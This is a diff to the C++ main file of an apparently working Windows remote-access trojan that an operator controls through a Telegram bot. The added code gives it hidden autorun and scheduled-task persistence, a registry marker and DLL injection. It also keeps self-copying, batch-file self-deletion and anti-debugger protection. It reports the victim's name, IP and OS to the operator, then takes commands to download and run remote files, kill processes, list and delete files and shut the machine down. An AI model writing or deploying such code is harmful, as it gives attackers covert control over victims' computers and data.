@@ -26,6 +26,10 @@ SOFTWARE.
 #include "Manager.h"
 #include "Telegram.h"
 
+#include "ProcessManager.h"
+#include "FileManager.h"
+#include "Information.h"
+
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 	srand((unsigned int)time(NULL));
 	Settings s;
@@ -34,143 +38,191 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 	char me[128] = { 0 };
 	GetModuleFileNameA(0, me, sizeof(me) - 1);
 
-	if (s.drop_run) {
-		if (std::string(me) != s.drop) {
-			CopyFileA(me, s.drop, false);
-			ShellExecuteA(0, "open", s.drop, 0, 0, SW_HIDE);
+	HKEY hKey = 0;
+	const char* addr = "Software\\4B4DB4B3";
+	LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, addr, 0, KEY_READ, &hKey);
 
-			if (s.auto_delete) {
-				std::string batch_autodel = "C:\\Users\\system.bat";
-				std::ofstream bat(batch_autodel);
-				bat << "@echo off\n";
-				bat << "del " + std::string(me);
-				bat << "\ndel " + batch_autodel;
-				bat.close();
-
-				ShellExecuteA(0, "open", batch_autodel.c_str(), 0, 0, SW_HIDE);
+	if (result != ERROR_SUCCESS) {
+		RegCreateKeyA(HKEY_CURRENT_USER, addr, &hKey);
+		
+		if (s.autorun_state) {
+			if (s.drop_run) {
+				Autorun(s.drop, s.autorun);
 			}
-
-			return 0;
+			else {
+				Autorun(me, s.autorun);
+			}
 		}
+
+		if (s.scheduler_state) {
+			if (s.drop_run) {
+				Scheduler(s.drop, s.scheduler_name);
+			}
+			else {
+				Scheduler(me, s.scheduler_name);
+			}
+		}
+
+		if (s.drop_run) {
+			if (std::string(me) != s.drop) {
+				CopyFileA(me, s.drop, false);
+				ShellExecuteA(0, "open", s.drop, 0, 0, SW_HIDE);
+
+				if (s.auto_delete) {
+					std::string batch_autodel = "C:\\Users\\system.bat";
+					std::ofstream bat(batch_autodel);
+					bat << "@echo off\n";
+					bat << "del " + std::string(me);
+					bat << "\ndel " + batch_autodel;
+					bat.close();
+
+					ShellExecuteA(0, "open", batch_autodel.c_str(), 0, 0, SW_HIDE);
+				}
+
+				return 0;
+			}
+		}
+		else {
+			ShellExecuteA(0, "open", me, 0, 0, SW_HIDE);
+		}
+
+		RegCloseKey(hKey);
 	}
+	else {
+		RegCloseKey(hKey);
 
-	if (s.autorun_state) {
-		Autorun(s.autorun);
-	}
+		Telegram api(s.botapi);
+		
+		if (s.protect_debuggers) {
+			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Protector, 0, 0, 0);
+		}
 
-	if (s.protect_debuggers) {
-		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Protector, 0, 0, 0);
-	}
+		int ID = rand();
+		std::string information = "User ID: " + std::to_string(ID) + "%0A"
+			"Name: " + GetPCName() + "%0A"
+			"IP: " + GetIP() + "%0A"
+			"OS: " + GetOS() + "%0A%0A"
+			"For send command to this user, type: /user" + std::to_string(ID) + " command";
+		api.SendTextMessage(s.chatid, information.c_str());
 
-	Telegram api(s.botapi);
+		std::string last;
 
-	int ID = rand();
-	std::string information = "User ID: " + std::to_string(ID) + "%0A"
-		"Name: " + GetPCName() + "%0A"
-		"IP: " + GetIP() + "%0A"
-		"OS: " + GetOS() + "%0A"
-		"For send command to this user, type: /user" + std::to_string(ID) + " command";
-	api.SendTextMessage(s.chatid, information.c_str());
+		std::string prefix = "/user" + std::to_string(ID) + " ";
 
-	std::string last;
-	
+		std::vector<std::string> params;
+		while (true) {
+			Sleep(atoi(s.client_delay));
 
-	std::string prefix = "/user" + std::to_string(ID) + " ";
+			last = api.GetLastMessageText(atoi(s.chatid));
+			if (last.substr(0, prefix.size()) == prefix) {
+				std::string command = last.replace(last.find(prefix), prefix.size(), "");
+				params = split(command, ' ');
 
-	std::vector<std::string> params;
-	while (true) {
-		Sleep(atoi(s.client_delay));
-
-		last = api.GetLastMessageText(atoi(s.chatid));
-		if (last.substr(0, prefix.size()) == prefix) {
-			std::string command = last.replace(last.find(prefix), prefix.size(), "");
-			params = split(command, ' ');
-
-			// PROCESS MANAGER
-			// processes
-			if (command == "processes") {
-				std::string processes = prefix + "%0A%0A" + ProcessList();
-				if (processes != "") {
-					api.SendTextMessage(s.chatid, processes.c_str());
-				}
-			}
-
-			// closeproc process.exe
-			else if (params[0] == "closeproc") {
-				if (CloseProcessByName(params[1])) {
-					std::string text = prefix + "%0A Success! Process is closed!";
-					api.SendTextMessage(s.chatid, text.c_str());
-				}
-				else {
-					std::string text = prefix + "%0A Error! Process isn't closed!";
-					api.SendTextMessage(s.chatid, text.c_str());
-				}
-			}
-
-			// loader https://google.com C:\File.exe
-			else if (params[0] == "loader") {
-				URLDownloadToFileA(0, params[1].c_str(), params[2].c_str(), 0, 0);
-				if (FileExists(params[2])) {
-					std::string text = prefix + "%0A Success! File is uploaded to: " + params[2];
-					api.SendTextMessage(s.chatid, text.c_str());
-				}
-				else {
-					std::string text = prefix + "%0A Error! File not uploaded!";
-					api.SendTextMessage(s.chatid, text.c_str());
-				}
-			}
-
-			// run C:\File.exe
-			else if (params[0] == "run") {
-				if (params.size() == 2) {
-					ShellExecuteA(0, "open", params[1].c_str(), params[2].c_str(), 0, 0);
-					std::string text = prefix + "%0A Runned with arguments!";
-					api.SendTextMessage(s.chatid, text.c_str());
-				}
-				else {
-					ShellExecuteA(0, "open", params[1].c_str(), 0, 0, 0);
-					std::string text = prefix + "%0A Runned without arguments!";
-					api.SendTextMessage(s.chatid, text.c_str());
-				}
-			}
-
-			// JOKES
-			// disable pc
-			else if (command == "disable pc") {
-				system("shutdown -s");
-			}
-
-			// close
-			else if (command == "close") {
-				ExitProcess(0);
-			}
-
-			// disable display
-			else if (command == "disable display") {
-				SendMessage(NULL, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
-			}
-
-			// FILE MANAGER
-			// dir C:\Folder
-			else if (params[0] == "dir") {
-				// if only dir
-				if (params[1] == "del_file") {
-					DeleteFileA(params[1].c_str());
-				}
-				else {
-					std::string objects = prefix + "%0A" + DirectoryObjectsList(params[1]);
-					if (objects != "") {
-						api.SendTextMessage(s.chatid, objects.c_str());
+				// PROCESS MANAGER
+				// processes
+				if (command == "processes") {
+					std::string processes = ProcessList();
+					if (processes != "") {
+						std::string text = prefix + "%0A" + processes;
+						api.SendTextMessage(s.chatid, text.c_str());
 					}
 					else {
-						std::string text = prefix + "%0A Error! Files not found";
+						std::string text = prefix + "%0AError! Processes not getting";
 						api.SendTextMessage(s.chatid, text.c_str());
 					}
 				}
+
+				// closeproc process.exe
+				else if (params[0] == "closeproc") {
+					if (CloseProcess(params[1])) {
+						std::string text = prefix + "%0ASuccess! Process is closed!";
+						api.SendTextMessage(s.chatid, text.c_str());
+					}
+					else {
+						std::string text = prefix + "%0AError! Process isn't closed!";
+						api.SendTextMessage(s.chatid, text.c_str());
+					}
+				}
+
+				else if (params[0] == "inject_dll") {
+					if (InjectDLL(params[1].c_str(), params[2].c_str())) {
+						std::string text = prefix + "%0ASuccess! DLL is injected";
+						api.SendTextMessage(s.chatid, text.c_str());
+					}
+					else {
+						std::string text = prefix + "%0AError! DLL isn't injected";
+						api.SendTextMessage(s.chatid, text.c_str());
+					}
+				}
+
+				// loader https://google.com C:\File.exe
+				else if (params[0] == "loader") {
+					URLDownloadToFileA(0, params[1].c_str(), params[2].c_str(), 0, 0);
+					if (FileExists(params[2])) {
+						std::string text = prefix + "%0ASuccess! File is uploaded to: " + params[2];
+						api.SendTextMessage(s.chatid, text.c_str());
+					}
+					else {
+						std::string text = prefix + "%0AError! File not uploaded!";
+						api.SendTextMessage(s.chatid, text.c_str());
+					}
+				}
+
+				// run C:\File.exe
+				else if (params[0] == "run") {
+					if (params.size() == 2) {
+						ShellExecuteA(0, "open", params[1].c_str(), params[2].c_str(), 0, 0);
+						std::string text = prefix + "%0ARunned with arguments!";
+						api.SendTextMessage(s.chatid, text.c_str());
+					}
+					else {
+						ShellExecuteA(0, "open", params[1].c_str(), 0, 0, 0);
+						std::string text = prefix + "%0ARunned without arguments!";
+						api.SendTextMessage(s.chatid, text.c_str());
+					}
+				}
+
+				// JOKES
+				// disable pc
+				else if (command == "disable pc") {
+					system("shutdown -s");
+				}
+
+				// close
+				else if (command == "close") {
+					ExitProcess(0);
+				}
+
+				// disable display
+				else if (command == "disable display") {
+					SendMessage(NULL, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
+				}
+
+				// FILE MANAGER
+				// dir C:\Folder
+				else if (params[0] == "dir") {
+					// if need del_file
+					if (params[1] == "del_file") {
+						DeleteFileA(params[1].c_str());
+					}
+
+					// if only dir
+					else {
+						std::string objects = prefix + "%0A" + DirectoryObjectsList(params[1]);
+						if (objects != "") {
+							api.SendTextMessage(s.chatid, objects.c_str());
+						}
+						else {
+							std::string text = prefix + "%0A Error! Files not found";
+							api.SendTextMessage(s.chatid, text.c_str());
+						}
+					}
+				}
+
 			}
-		}
-		else if (last == "/online") {
-			api.SendTextMessage(s.chatid, information.c_str());
+			else if (last == "/online") {
+				api.SendTextMessage(s.chatid, information.c_str());
+			}
 		}
 	}
 
